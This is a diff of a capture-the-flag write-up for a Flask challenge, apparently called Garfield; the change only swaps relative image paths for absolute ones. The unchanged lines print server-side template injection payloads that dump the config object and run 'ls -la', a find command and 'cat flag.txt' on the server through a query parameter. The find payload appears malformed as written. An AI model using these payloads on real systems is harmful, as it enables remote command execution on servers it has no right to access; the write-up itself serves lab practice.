@@ -94,7 +94,7 @@
  ---
 ### Exploring the Environment
     Payload:/mylabs?word_5={{config}}
- ![Config output](../assets/Garfield_2.png)
+ ![Config output](/assets/Garfield_2.png)
  
     This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
 
@@ -103,7 +103,7 @@
 ### Listing Files
 
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
- ![ls output](../assets/Garfield_3.png)
+ ![ls output](/assets/Garfield_3.png)
 
  ---
 
@@ -111,7 +111,7 @@
 
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
 
- ![find output](../assets/Garfield_4.png)
+ ![find output](/assets/Garfield_4.png)
 
     This revealed the presence of flag.txt.
 
@@ -119,7 +119,7 @@
 
 ### Reading the Flag
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
- ![flag output](../assets/Garfield_5.png)
+ ![flag output](/assets/Garfield_5.png)
 
  ---
 
